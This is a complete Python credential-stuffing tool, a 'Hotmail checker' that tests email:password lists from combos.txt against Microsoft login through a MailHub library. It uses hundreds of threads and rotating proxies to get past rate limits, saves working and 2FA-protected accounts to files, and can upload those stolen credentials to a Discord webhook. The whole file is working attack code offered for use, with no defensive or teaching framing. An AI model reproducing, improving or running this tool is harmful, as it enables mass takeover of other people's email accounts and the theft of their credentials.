import os
import sys
import yaml
import requests
from datetime import datetime, timezone
from mailhub import MailHub
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import time

class Colors:
    RED = '\033[38;5;196m'
    GREEN = '\033[92m'
    YELLOW = '\033[38;5;226m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

print_lock = Lock()
file_lock = Lock()
stats_lock = Lock()

CONFIG_FOLDER = "config"
CONFIG_FILE = os.path.join(CONFIG_FOLDER, "config.yml")

DEFAULT_CONFIG = {
    'threads': 200,
    'use_proxies': False,
    'proxy_type': None,
    'proxy_file': None,
    'discord_webhook': False
}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def ensure_config_folder():
    if not os.path.exists(CONFIG_FOLDER):
        os.makedirs(CONFIG_FOLDER)

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return yaml.safe_load(f) or DEFAULT_CONFIG
        except Exception:
            return DEFAULT_CONFIG.copy()
    return DEFAULT_CONFIG.copy()

def save_config(config):
    ensure_config_folder()
    try:
        with open(CONFIG_FILE, 'w') as f:
            yaml.dump(config, f, default_flow_style=False)
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Failed to save config: {str(e)}{Colors.RESET}")

def send_discord_files(webhook_url, valid_count, twofa_count):
    if not webhook_url:
        return
    
    try:
        files_to_send = {}
        embeds = []
        
        if valid_count > 0 and os.path.exists('hits.txt'):
            with open('hits.txt', 'rb') as f:
                files_to_send['hits.txt'] = f.read()
            
            embeds.append({
                "title": f"✓ {valid_count} Valid Accounts",
                "description": "File attached: hits.txt",
                "color": 0x00FF00,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
        
        if twofa_count > 0 and os.path.exists('2fa.txt'):
            with open('2fa.txt', 'rb') as f:
                files_to_send['2fa.txt'] = f.read()
            
            embeds.append({
                "title": f"⚠️ {twofa_count} 2FA Accounts",
                "description": "File attached: 2fa.txt",
                "color": 0xFFFF00,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
        
        if embeds:
            payload = {"embeds": embeds}
            files = {name: (name, content) for name, content in files_to_send.items()}
            requests.post(webhook_url, data={"payload_json": str(payload).replace("'", '"')}, files=files, timeout=10)
    except Exception:
        pass

def load_proxies(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except FileNotFoundError:
        print(f"{Colors.RED}[ERROR] Proxy file '{filename}' not found!{Colors.RESET}")
        return []
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Failed to read proxy file: {str(e)}{Colors.RESET}")
        return []

def edit_config(config):
    print(f"\n{Colors.CYAN}╭─ {Colors.BOLD}Proxy Settings{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {Colors.MAGENTA}[Config]{Colors.RESET} Would you like to use proxies for checking? {Colors.YELLOW}y/n{Colors.RESET}")
    use_proxy = input(f"{Colors.CYAN}╰─>{Colors.RESET} ").strip().lower()
    config['use_proxies'] = (use_proxy == 'y')
    
    if config['use_proxies']:
        print(f"\n{Colors.CYAN}╭─ {Colors.BOLD}Proxy Type{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET} {Colors.MAGENTA}[Config]{Colors.RESET} What proxy type? {Colors.WHITE}(http/https/socks4/socks5){Colors.RESET}")
        proxy_type = input(f"{Colors.CYAN}╰─>{Colors.RESET} ").strip().lower()
        
        if proxy_type not in ['http', 'https', 'socks4', 'socks5']:
            print(f"{Colors.YELLOW}[!] Invalid proxy type, defaulting to http{Colors.RESET}")
            proxy_type = 'http'
        
        print(f"\n{Colors.CYAN}╭─ {Colors.BOLD}Proxy File{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET} {Colors.MAGENTA}[Config]{Colors.RESET} Enter proxy file name {Colors.WHITE}(e.g., proxies.txt){Colors.RESET}")
        proxy_file = input(f"{Colors.CYAN}╰─>{Colors.RESET} ").strip()
        
        if proxy_file:
            config['proxy_type'] = proxy_type
            config['proxy_file'] = proxy_file
        else:
            config['use_proxies'] = False
            config['proxy_type'] = None
            config['proxy_file'] = None
    else:
        config['proxy_type'] = None
        config['proxy_file'] = None
    
    print(f"\n{Colors.CYAN}╭─ {Colors.BOLD}Thread Settings{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {Colors.MAGENTA}[Config]{Colors.RESET} How many threads would you like to use? {Colors.WHITE}(max 500){Colors.RESET}")
    threads_input = input(f"{Colors.CYAN}╰─>{Colors.RESET} ").strip()
    try:
        threads = int(threads_input)
        config['threads'] = max(1, min(threads, 500))
    except ValueError:
        print(f"{Colors.YELLOW}[!] Invalid input, keeping current value{Colors.RESET}")
    
    print(f"\n{Colors.CYAN}╭─ {Colors.BOLD}Discord Webhook{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {Colors.MAGENTA}[Config]{Colors.RESET} Would you like to use Discord webhook? {Colors.YELLOW}y/n{Colors.RESET}")
    webhook_choice = input(f"{Colors.CYAN}╰─>{Colors.RESET} ").strip().lower()
    
    if webhook_choice == 'y':
        print(f"{Colors.CYAN}╭─ {Colors.BOLD}Discord Webhook{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET} {Colors.MAGENTA}[Config]{Colors.RESET} Enter Discord webhook URL")
        webhook_url = input(f"{Colors.CYAN}╰─>{Colors.RESET} ").strip()
        config['discord_webhook'] = webhook_url if webhook_url else None
    else:
        config['discord_webhook'] = None
    
    save_config(config)
    print(f"\n{Colors.GREEN}[✓] Configuration saved successfully!{Colors.RESET}")
    time.sleep(1)
    return config

def display_config(config):
    threads_line = f"Threads: {config['threads']}"
    proxy_status_text = "Yes" if config['use_proxies'] else "No"
    proxy_line = f"Use Proxies: {proxy_status_text}"
    webhook_status_text = "Enabled" if config.get('discord_webhook') else "Disabled"
    webhook_line = f"Discord Webhook: {webhook_status_text}"
    
    max_length = max(len("Here is your current config:"), len(threads_line), len(proxy_line), len(webhook_line))
    if config['use_proxies'] and config.get('proxy_file'):
        proxy_type_line = f"Proxy Type: {config.get('proxy_type', 'http')}"
        proxy_file_line = f"Proxy File: {config.get('proxy_file', 'N/A')}"
        max_length = max(max_length, len(proxy_type_line), len(proxy_file_line))
    
    box_width = max_length + 4
    
    print(f"\n{Colors.CYAN}╔{'═' * box_width}╗{Colors.RESET}")
    
    title = "Here is your current config:"
    title_padding = box_width - len(title) - 2
    print(f"{Colors.CYAN}║{Colors.RESET} {Colors.MAGENTA}{Colors.BOLD}{title}{Colors.RESET}{' ' * title_padding} {Colors.CYAN}║{Colors.RESET}")
    
    print(f"{Colors.CYAN}╠{'═' * box_width}╣{Colors.RESET}")
    
    threads_text = f"Threads: {Colors.GREEN}{config['threads']}{Colors.RESET}"
    threads_padding = box_width - len(threads_line) - 2
    print(f"{Colors.CYAN}║{Colors.RESET} {threads_text}{' ' * threads_padding} {Colors.CYAN}║{Colors.RESET}")
    
    proxy_color = Colors.GREEN if config['use_proxies'] else Colors.RED
    proxy_text = f"Use Proxies: {proxy_color}{proxy_status_text}{Colors.RESET}"
    proxy_padding = box_width - len(proxy_line) - 2
    print(f"{Colors.CYAN}║{Colors.RESET} {proxy_text}{' ' * proxy_padding} {Colors.CYAN}║{Colors.RESET}")
    
    if config['use_proxies'] and config.get('proxy_file'):
        proxy_type = config.get('proxy_type', 'http')
        proxy_type_text = f"Proxy Type: {Colors.YELLOW}{proxy_type}{Colors.RESET}"
        proxy_type_padding = box_width - len(proxy_type_line) - 2
        print(f"{Colors.CYAN}║{Colors.RESET} {proxy_type_text}{' ' * proxy_type_padding} {Colors.CYAN}║{Colors.RESET}")
        
        proxy_file = config.get('proxy_file', 'N/A')
        proxy_file_text = f"Proxy File: {Colors.YELLOW}{proxy_file}{Colors.RESET}"
        proxy_file_padding = box_width - len(proxy_file_line) - 2
        print(f"{Colors.CYAN}║{Colors.RESET} {proxy_file_text}{' ' * proxy_file_padding} {Colors.CYAN}║{Colors.RESET}")
    
    webhook_color = Colors.GREEN if config.get('discord_webhook') else Colors.RED
    webhook_text = f"Discord Webhook: {webhook_color}{webhook_status_text}{Colors.RESET}"
    webhook_padding = box_width - len(webhook_line) - 2
    print(f"{Colors.CYAN}║{Colors.RESET} {webhook_text}{' ' * webhook_padding} {Colors.CYAN}║{Colors.RESET}")
    
    print(f"{Colors.CYAN}╚{'═' * box_width}╝{Colors.RESET}")

def is_valid_combo(line):
    line = line.strip()
    
    if not line:
        return False
    
    spam_indicators = [
        'telegram', 't.me', 'discord', 'http://', 'https://',
        '___By@', 'C--l--o--u--d', '!!!', 'H--O--T--M--A--I--L',
        '(ow)z', 'BACK_UP', '##', '@@', '__', '--'
    ]
    
    line_lower = line.lower()
    if any(indicator.lower() in line_lower for indicator in spam_indicators):
        return False
    
    if line.count(':') != 1:
        return False
    
    parts = line.split(':', 1)
    if len(parts) != 2:
        return False
    
    email, password = parts
    email = email.strip()
    password = password.strip()
    
    if '@' not in email or len(email) < 3:
        return False
    
    if not password or len(password) < 1:
        return False
    
    valid_email_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-+')
    if not all(c in valid_email_chars for c in email):
        return False
    
    return True

def load_combos(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            all_lines = [line.strip() for line in f if line.strip()]
        
        combos = [line for line in all_lines if is_valid_combo(line)]
        
        seen = set()
        unique_combos = []
        for combo in combos:
            if combo not in seen:
                seen.add(combo)
                unique_combos.append(combo)
        
        return unique_combos
    except FileNotFoundError:
        print(f"{Colors.RED}[ERROR] File '{filename}' not found!{Colors.RESET}")
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("")
        return []
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Failed to read file: {str(e)}{Colors.RESET}")
        return []

def save_result(filename, content):
    try:
        with file_lock:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        return True
    except Exception:
        return False

def check_account(checker, email, password, proxy=None):
    try:
        result = checker.loginMICROSOFT(email, password, proxy)
        
        if result[0] == "ok":
            return "VALID", result[1] if len(result) > 1 else None
        elif result[0] == "nfa":
            return "2FA", None
        elif result[0] == "retry":
            return "INVALID", None
        elif result[0] == "fail":
            return "INVALID", None
        else:
            return "INVALID", None
            
    except Exception:
        return "INVALID", None

def print_banner():
    banner = f"""
{Colors.MAGENTA}{Colors.BOLD}  ╦ ╦╔═╗╔╦╗╔╦╗╔═╗╦╦    ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
  ╠═╣║ ║ ║ ║║║╠═╣║║    ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
  ╩ ╩╚═╝ ╩ ╩ ╩╩ ╩╩╩═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═{Colors.RESET}
"""
    print(banner)

def log_result(status, combo):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if status == "VALID":
        with print_lock:
            print(f"{Colors.GREEN}[{timestamp}] VALID: {combo}{Colors.RESET}")
    elif status == "2FA":
        with print_lock:
            print(f"{Colors.YELLOW}[{timestamp}] 2FA: {combo}{Colors.RESET}")
    elif status == "INVALID":
        with print_lock:
            print(f"{Colors.RED}[{timestamp}] INVALID: {combo}{Colors.RESET}")

def process_combo(combo, proxies, proxy_type, index, total, stats):
    checker = None
    try:
        email, password = combo.split(':', 1)
        checker = MailHub()
        
        proxy = None
        if proxies:
            import random
            proxy_addr = random.choice(proxies)
            
            clean_proxy = proxy_addr
            if '://' in proxy_addr:
                clean_proxy = proxy_addr.split('://', 1)[1]
            
            proxy = {
                'http': f'http://{clean_proxy}',
                'https': f'http://{clean_proxy}'
            }
        
        status, extra = check_account(checker, email, password, proxy)
        
        with stats_lock:
            stats['checked'] += 1
            
            if status == "VALID":
                stats['valid'] += 1
                save_result('hits.txt', combo)
                log_result("VALID", combo)
                
            elif status == "2FA":
                stats['2fa'] += 1
                save_result('2fa.txt', combo)
                log_result("2FA", combo)
                
            elif status == "INVALID":
                stats['invalid'] += 1
                log_result("INVALID", combo)
            
    except Exception:
        with stats_lock:
            stats['invalid'] += 1
    finally:
        if checker:
            del checker

def run_checker():
    clear_screen()
    print_banner()
    
    ensure_config_folder()
    config = load_config()
    
    display_config(config)
    
    print(f"\n{Colors.CYAN}╭─ {Colors.BOLD}Configuration{Colors.RESET}")
    happy = input(f"{Colors.CYAN}│{Colors.RESET} Are you happy with this config? {Colors.GREEN}(y to start checking, n to edit){Colors.RESET}\n{Colors.CYAN}╰─>{Colors.RESET} ").strip().lower()
    
    if happy == 'n':
        config = edit_config(config)
        clear_screen()
        print_banner()
        display_config(config)
    
    combo_file = "combos.txt"
    
    combos = load_combos(combo_file)
    
    if not combos:
        print(f"\n{Colors.RED}[✗] No valid combos found in combos.txt{Colors.RESET}")
        input(f"\n{Colors.WHITE}Press Enter to exit...{Colors.RESET}")
        return
    
    print(f"\n{Colors.GREEN}[✓] Loaded {len(combos)} combos{Colors.RESET}")
    
    proxies = []
    if config['use_proxies'] and config.get('proxy_file'):
        proxies = load_proxies(config.get('proxy_file'))
        if proxies:
            print(f"{Colors.GREEN}[✓] Loaded {len(proxies)} proxies{Colors.RESET}")
            if config['threads'] > 100:
                print(f"{Colors.YELLOW}[!] Reducing threads to 100 when using proxies for better stability{Colors.RESET}")
                config['threads'] = 100
        else:
            print(f"{Colors.YELLOW}[!] No proxies loaded, continuing without proxies{Colors.RESET}")
            config['use_proxies'] = False
    
    print()
    
    webhook_url = config.get('discord_webhook')
    
    stats = {
        'total': len(combos),
        'checked': 0,
        'valid': 0,
        '2fa': 0,
        'invalid': 0
    }
    
    start_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
            futures = []
            for i, combo in enumerate(combos, 1):
                future = executor.submit(
                    process_combo, 
                    combo, 
                    proxies,
                    config.get('proxy_type', 'http'),
                    i, 
                    stats['total'], 
                    stats
                )
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Checker stopped by user{Colors.RESET}")
    
    print(f"\n\n{Colors.GREEN}{Colors.BOLD}✓ CHECKING COMPLETE!{Colors.RESET}\n")
    
    if stats['valid'] > 0:
        print(f"{Colors.GREEN}[✓] {stats['valid']} Valid accounts saved to: hits.txt{Colors.RESET}")
    if stats['2fa'] > 0:
        print(f"{Colors.YELLOW}[✓] {stats['2fa']} 2FA accounts saved to: 2fa.txt{Colors.RESET}")
    
    if webhook_url and (stats['valid'] > 0 or stats['2fa'] > 0):
        print(f"\n{Colors.CYAN}[✓] Sending files to Discord webhook...{Colors.RESET}")
        send_discord_files(webhook_url, stats['valid'], stats['2fa'])
    
    input(f"\n{Colors.WHITE}Press Enter to exit...{Colors.RESET}")

if __name__ == "__main__":
    try:
        run_checker()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program terminated{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR] Unexpected error: {str(e)}{Colors.RESET}")
        input(f"{Colors.WHITE}Press Enter to exit...{Colors.RESET}")
        sys.exit(1)